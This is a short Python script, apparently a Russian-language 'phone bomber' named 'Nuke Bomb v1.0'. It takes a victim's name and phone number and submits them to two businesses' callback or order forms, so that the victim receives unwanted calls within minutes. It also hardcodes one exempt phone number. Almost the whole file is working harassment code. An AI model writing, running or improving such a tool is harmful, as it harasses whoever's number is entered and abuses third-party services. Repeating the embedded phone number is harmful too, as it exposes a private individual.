import requests
import fake_useragent

from fake_useragent import UserAgent
userAgent = UserAgent().random

print('''
███╗░░██╗██╗░░░██╗██╗░░██╗███████╗
████╗░██║██║░░░██║██║░██╔╝██╔════╝
██╔██╗██║██║░░░██║█████═╝░█████╗░░
██║╚████║██║░░░██║██╔═██╗░██╔══╝░░
██║░╚███║╚██████╔╝██║░╚██╗███████╗
╚═╝░░╚══╝░╚═════╝░╚═╝░░╚═╝╚══════╝
	''')

print('Привет, это Nuke Bomb v1.0.\nЧтобы начать атаку, укажи любое имя и номер телефона без +7.\nДоступно 2 сервиса.\n')
print('Автор: floomyzz\n')


name = input('Введите имя: ')
phone = int(input('Введите номер телефона: '))

if phone == 9038052989:
    print('Этот номер использовать нельзя.')
else:
    data1 = {
    	'order[fio]':name,
    	'order[phone]':phone
    }
    url1 = 'https://f3.voloxin.ru/'
    s1 = requests.Session()
    login1 = s1.post(url1, data=data1)


    data2 = {
    	'name':name,
    	'phone':phone
    }
    url2 = 'https://okoplus.halaszni.com/'
    s2 = requests.Session()
    login2 = s2.post(url2, data=data2)

    input('Добавление номеров в базу окончено.\nЗвонки поступят в ближайшие 5 минут.\nВведите любой символ для закрытия.')

input('Наберите любой символ для закрытия программы.')